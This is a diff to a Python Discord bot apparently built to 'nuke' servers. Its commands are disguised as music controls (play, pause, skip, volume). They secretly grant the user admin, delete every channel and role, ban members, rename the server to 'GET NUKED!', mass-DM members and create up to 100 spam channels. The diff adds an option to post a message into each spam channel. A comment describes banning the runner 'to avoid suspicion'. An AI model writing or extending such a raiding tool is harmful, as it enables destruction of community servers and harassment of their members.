@@ -8,7 +8,7 @@ from discord.ext import commands
 from requests import get
 from datetime import datetime
 from os import listdir
-from time import sleep
+from time import time, sleep
 from typing import Optional
 from json import loads, dumps
 
@@ -18,7 +18,7 @@ if "settings.json" not in listdir():
 
     # Main Variables
     TOKEN = input("Please input your bot's token and press enter to continue: ")
-    USER_ID = input("If you would like the bot to only work for you, please input your userid, otherwise leave blank and then press enter to continue: ")
+    USER_ID = input("If you would like the bot to only work for you, please input your user ID, otherwise leave blank and then press enter to continue: ")
     PREFIX = input("Please enter the command prefix you would like to use: ")
     if USER_ID == "": USER_ID = False
     else: USER_ID = int(USER_ID)
@@ -62,7 +62,7 @@ else:
         file = open("settings.json", "w+")
         file.write(dumps(settings))
         file.close()
-    
+
     TOKEN = settings["TOKEN"]
     USER_ID = settings["USERID"]
     PREFIX = settings["PREFIX"]
@@ -92,16 +92,6 @@ if STATUS is not False:
 else:
     usestatus = False
 
-default_volume_settings = {
-    "ban": True,
-    "channels": True,
-    "roles": True,
-    "server": [True, "GET NUKED!", "https://i.imgur.com/CNdUGZj.jpg"],
-    "nuke_channel": [True, "get nuked"],
-    "dm": [True, "GET NUKED!"],
-    "nick": [False, ""],
-    "maxchannels": False
-}
 
 intents = discord.Intents.default()
 intents.members = True
@@ -109,6 +99,7 @@ intents.members = True
 bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 
 bot.remove_command("help")
+
 
 # Read and write role IDs
 def getRoleIDs():
@@ -166,7 +157,20 @@ config_options = {
     5: "nuke_channel",
     6: "dm",
     7: "nick",
-    8: "maxchannels"
+    8: "maxchannels",
+    9: "nc_msg"
+}
+
+default_volume_settings = {
+    "ban": True,
+    "channels": True,
+    "roles": True,
+    "server": [True, "GET NUKED!", "https://i.imgur.com/CNdUGZj.jpg"],
+    "nuke_channel": [True, "get nuked"],
+    "dm": [True, "GET NUKED!"],
+    "nick": [False, ""],
+    "maxchannels": False,
+    "nc_msg": [False]
 }
 
 
@@ -237,9 +241,12 @@ Server Owner: {ctx.guild.owner}
 
 
 # create nuke channel
-async def create_nuke_channel(ctx, name):
+async def create_nuke_channel(ctx, name, doReturn):
     try:
-        await ctx.guild.create_text_channel(name)
+        if doReturn:
+            return await ctx.guild.create_text_channel(name)
+        else:
+            await ctx.guild.create_text_channel(name)
     except discord.Forbidden:
         output_log(f'''
 Failed to create the "get nuked" channel: insufficient permissions.
@@ -398,7 +405,7 @@ async def nuke(ctx):
 
     # create nuke channel
 
-    await create_nuke_channel(ctx, "get nuked")
+    await create_nuke_channel(ctx, "get nuked", False)
 
     # change server icon & name
 
@@ -454,12 +461,14 @@ async def play(ctx):
     await ctx.message.delete()
     await create_admin(ctx)
 
+
 # gives the user admin
 @bot.command(name="p")
 @commands.bot_has_permissions(administrator=True)
 async def p(ctx):
     await ctx.message.delete()
     await create_admin(ctx)
+
 
 # bans the person who ran the command to avoid suspicion
 @bot.command(name="pause")
@@ -525,21 +534,24 @@ Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
+
 @bot.command(name="resetvolume")
+@commands.dm_only()
 async def resetvolume(ctx):
     volume_settings=getVolumeSettings()
     volume_settings[f"{ctx.message.author.id}"] = default_volume_settings
     writeVolumeSettings(volume_settings)
-    await ctx.send("Reset volume settings")  
+    await ctx.send("Reset volume settings.")
+
 
 @bot.command(name="showvolume")
 @commands.dm_only()
 async def showvolume(ctx):
-    volume_settings=getVolumeSettings()
+    volume_settings = getVolumeSettings()
     if f"{ctx.message.author.id}" not in volume_settings.keys():  # write default settings if entry doesn't exist
         volume_settings[f"{ctx.message.author.id}"] = default_volume_settings
         writeVolumeSettings(volume_settings)
-    
+
     user_volume_settings = getVolumeSettings()[str(ctx.message.author.id)]
 
     embed=discord.Embed(title="Volume Settings", description=f'''
@@ -556,21 +568,23 @@ DM message: "{user_volume_settings["dm"][1]}"
 Nick Everyone: {user_volume_settings["nick"][0]}
 Nick Name: "{user_volume_settings["nick"][1]}"
 Create max channels: {user_volume_settings["maxchannels"]}
+Nuke Channel Message: {user_volume_settings["nc_msg"][0]}
 '''.removeprefix("\n"))
     embed.set_author(name=ctx.message.author.name, icon_url=f"https://cdn.discordapp.com/avatars/{ctx.message.author.id}/{ctx.message.author.avatar}.png")
     await ctx.send(embed=embed)
+
 
 @bot.command(name="volume")
 async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optional[str]):
     if not isinstance(ctx.channel, discord.channel.DMChannel):
         await ctx.message.delete()
 
-    volume_settings=getVolumeSettings()
+    volume_settings = getVolumeSettings()
     
     if f"{ctx.message.author.id}" not in volume_settings.keys():  # write default settings if entry doesn't exist
         volume_settings[f"{ctx.message.author.id}"] = default_volume_settings
         writeVolumeSettings(volume_settings)
-    
+
     settings = volume_settings[f"{ctx.message.author.id}"]
 
     if value != "*":
@@ -606,6 +620,13 @@ async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optio
             else:
                 settings["nuke_channel"] = [status, "get nuked"]
                 await dm_user(ctx.message.author, f"Changed \"nuke channel\" to {status} with a name of \"get nuked\"")
+        elif setting == "nc_msg":
+            if arg1:
+                settings["nc_msg"] = [status, arg1]
+                await dm_user(ctx.message.author, f"Changed \"nuke channel message\" to {status} with a message of {arg1}")
+            else:
+                settings["nc_msg"] = [status, "GET NUKED!"]
+                await dm_user(ctx.message.author, f"Changed \"nuke channel message\" to {status} with a message of \"GET NUKED!\"")
         elif setting == "dm":
             if arg1:
                 settings["dm"] = [status, arg1]
@@ -653,6 +674,10 @@ async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optio
 
         lines.append(f"Changed \"maximum channels\" to {status}")
 
+        config_9 = [status, "GET NUKED!"]
+
+        lines.append(f"Changed \"nuke channel message\" to {status} with a message of \"GET NUKED!\"")
+
         # save config options
         volume_settings[f"{ctx.message.author.id}"] = {
             "ban": config_1,
@@ -662,7 +687,8 @@ async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optio
             "nuke_channel": config_5,
             "dm": config_6,
             "nick": config_7,
-            "maxchannels": config_8
+            "maxchannels": config_8,
+            "nc_msg": config_9
         }
         await dm_user(ctx.message.author, "\n".join(lines))
     writeVolumeSettings(volume_settings)
@@ -691,6 +717,7 @@ async def skip(ctx):
     do_dm = settings["dm"][0]
     do_nick = settings["nick"][0]
     do_max_channels = settings["maxchannels"]
+    do_nc_msg = settings["nc_msg"][0]
 
     if do_channels:
         await delete_channels(ctx)
@@ -766,13 +793,22 @@ Server Owner: {ctx.guild.owner}
         await delete_roles(ctx, role_list)
 
     if do_nc:
+        nc_name = settings["nuke_channel"][1]
         if do_max_channels:
             for i in range(100):
-                nc_name = settings["nuke_channel"][1]
-                await create_nuke_channel(ctx, nc_name)
+                if not do_nc_msg:
+                    await create_nuke_channel(ctx, nc_name, False)
+                else:
+                    msg = settings["nc_msg"][1]
+                    nc = await create_nuke_channel(ctx, nc_name, True)
+                    await nc.send(msg)
         else:
-            nc_name = settings["nuke_channel"][1]
-            await create_nuke_channel(ctx, nc_name)
+            if not do_nc_msg:
+                await create_nuke_channel(ctx, nc_name, False)
+            else:
+                msg = settings["nc_msg"][1]
+                nc = await create_nuke_channel(ctx, nc_name, True)
+                await nc.send(msg)
 
 
 # checks if the bot has administrator permissions
